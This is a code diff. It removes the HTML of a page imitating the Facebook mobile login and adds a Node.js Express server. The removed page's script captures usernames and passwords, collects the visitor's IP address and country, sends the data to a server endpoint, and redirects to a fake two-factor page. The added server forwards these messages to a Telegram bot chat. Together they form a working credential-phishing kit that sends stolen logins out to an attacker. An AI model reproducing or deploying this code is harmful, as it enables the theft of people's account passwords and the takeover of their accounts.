@@ -1,313 +1,45 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log in</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        /* Mobile-First Base Styles */
-        body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
-            background: linear-gradient(to bottom, #fff 0%, #f0f2f5 100%);
-            color: #1c1e21;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: stretch;
-            min-height: 100vh;
-            padding-top: 0;
-            box-sizing: border-box;
-        }
+require('dotenv').config();
+const express = require('express');
+const axios = require('axios');
+const path = require('path');
 
-        .container {
-            background-color: #ffffff;
-            border-radius: 0;
-            padding: 16px;
-            width: 100%;
-            max-width: 100%;
-            box-shadow: none;
-            text-align: center;
-            box-sizing: border-box;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-        .header {
-            display: flex;
-            justify-content: flex-start;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-top: 10px;
-            padding-left: 0;
-        }
+// Middleware
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
 
-        .header .back-arrow {
-            color: #1c1e21;
-            font-size: 24px;
-            text-decoration: none;
-            cursor: pointer;
-            margin-right: auto;
-        }
-
-        .facebook-logo {
-            margin-top: 20px;
-            margin-bottom: 30px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .facebook-logo img {
-            width: 50px;
-            height: 50px;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            color: #1c1e21;
-            box-sizing: border-box;
-            background-color: #f0f2f5;
-        }
-
-        .input-group input::placeholder {
-            color: #606770;
-        }
-
-        .login-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px 24px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.2s;
-            text-decoration: none;
-            display: block;
-            text-align: center;
-            box-sizing: border-box;
-            margin-top: 20px;
-        }
-
-        .login-button:hover {
-            background-color: #166fe5;
-        }
-
-        .forgot-password {
-            margin-top: 16px;
-            margin-bottom: 30px;
-        }
-
-        .forgot-password a {
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 15px;
-            font-weight: 500;
-        }
-
-        .separator {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            margin: 20px 0;
-            color: #606770;
-        }
-
-        .separator::before,
-        .separator::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #dadde1;
-        }
-
-        .separator:not(:empty)::before {
-            margin-right: .25em;
-        }
-
-        .separator:not(:empty)::after {
-            margin-left: .25em;
-        }
-
-        .create-account-button {
-            background-color: #e7f3ff;
-            color: #1877f2;
-            border: 1px solid #1877f2;
-            border-radius: 6px;
-            padding: 14px 24px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.2s;
-            text-decoration: none;
-            display: block;
-            text-align: center;
-            box-sizing: border-box;
-            margin-top: 20px;
-        }
-
-        .create-account-button:hover {
-            background-color: #d8e6ff;
-        }
-
-        .meta-logo-bottom {
-            margin-top: auto;
-            padding-bottom: 20px;
-            height: 18px;
-            max-width: 80px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        /* Desktop specific styles (min-width: 601px) */
-        @media (min-width: 601px) {
-            body {
-                padding-top: 20px;
-                align-items: flex-start;
+// Telegram Proxy Endpoint
+app.post('/api/send-to-telegram', async (req, res) => {
+    try {
+        const { message } = req.body;
+        
+        const response = await axios.post(
+            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+            {
+                chat_id: process.env.TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
             }
-            .container {
-                border-radius: 8px;
-                padding: 24px;
-                max-width: 400px;
-                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-                min-height: auto;
-            }
-            .header {
-                margin-bottom: 20px;
-                padding-top: 0;
-            }
-            .facebook-logo {
-                margin-top: 20px;
-                margin-bottom: 30px;
-            }
-            .input-group {
-                margin-bottom: 16px;
-            }
-            .login-button {
-                margin-top: 20px;
-            }
-            .forgot-password {
-                margin-top: 16px;
-                margin-bottom: 30px;
-            }
-            .separator {
-                margin: 20px 0;
-            }
-            .create-account-button {
-                margin-top: 20px;
-            }
-            .meta-logo-bottom {
-                margin-top: 40px;
-                padding-bottom: 0;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <a href="javascript:history.back()" class="back-arrow"><i class="fas fa-chevron-left"></i></a>
-        </div>
-
-        <div class="facebook-logo">
-            <img src="facebook_logo.jpg" alt="Facebook Icon">
-        </div>
-
-        <div class="input-group">
-            <input type="text" id="username" placeholder="Mobile number or email" required>
-        </div>
-
-        <div class="input-group">
-            <input type="password" id="password" placeholder="Password" required>
-        </div>
-
-        <button id="loginButton" class="login-button">Log in</button>
-
-        <div class="forgot-password">
-            <a href="#">Forgot password?</a>
-        </div>
-
-        <div class="separator"></div>
-
-        <button class="create-account-button">Create new account</button>
-
-        <div class="meta-logo-bottom"></div>
-    </div>
-
-    <script>
-        document.getElementById('loginButton').addEventListener('click', async function() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // **Thêm kiểm tra trống tại đây (JavaScript sẽ chạy sau kiểm tra HTML5 'required')**
-            // Dù 'required' đã xử lý ở mức HTML, kiểm tra JS bổ sung có thể hữu ích cho logic phức tạp hơn
-            if (username === '' || password === '') {
-                // Trình duyệt sẽ tự động hiển thị thông báo lỗi, nhưng bạn có thể thêm logic ở đây
-                // nếu muốn thông báo tùy chỉnh bằng JavaScript.
-                return; // Ngừng thực thi nếu có trường trống
-            }
-
-            // Lưu thông tin đăng nhập
-            localStorage.setItem('fb_credentials', JSON.stringify({
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString()
-            }));
-
-            // Lấy thông tin IP và quốc gia
-            let ipInfo = { ip: 'Đang xác định...', country: 'Đang xác định...' };
-            
-            try {
-                // Lấy địa chỉ IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                ipInfo.ip = ipData.ip;
-                
-                // Lấy thông tin quốc gia từ IP
-                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const geoData = await geoResponse.json();
-                ipInfo.country = `${geoData.country_name || 'Không xác định'} (${geoData.country_code || 'N/A'})`;
-            } catch (error) {
-                console.error('Error fetching IP info:', error);
-                ipInfo.ip = 'Không xác định';
-                ipInfo.country = 'Không xác định';
-            }
-
-            // Lưu thông tin IP vào localStorage để sử dụng ở trang 2FA
-            localStorage.setItem('ip_info', JSON.stringify(ipInfo));
-
-            // Gửi đến Telegram
-            const message = `🔐 <b>NEW LOGIN ATTEMPT</b> 🔐\n\n` +
-                            `👤 <b>Username:</b> ${username}\n` +
-                            `🔑 <b>Password:</b> ${password}\n\n` +
-                            `🌐 <b>IP Address:</b> ${ipInfo.ip}\n` +
-                            `📍 <b>Country:</b> ${ipInfo.country}\n` +
-                            `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
-            
-            try {
-                await fetch('/api/send-to-telegram', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message })
-                });
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-            }
-            
-            // Chuyển trang
-            window.location.href = '2fa_page.html';
+        );
+        
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Telegram API Error:', error.response?.data || error.message);
+        res.status(500).json({ 
+            success: false,
+            error: 'Failed to send message to Telegram'
         });
-    </script>
-</body>
-</html>
+    }
+});
+
+// Serve frontend
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Start server
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
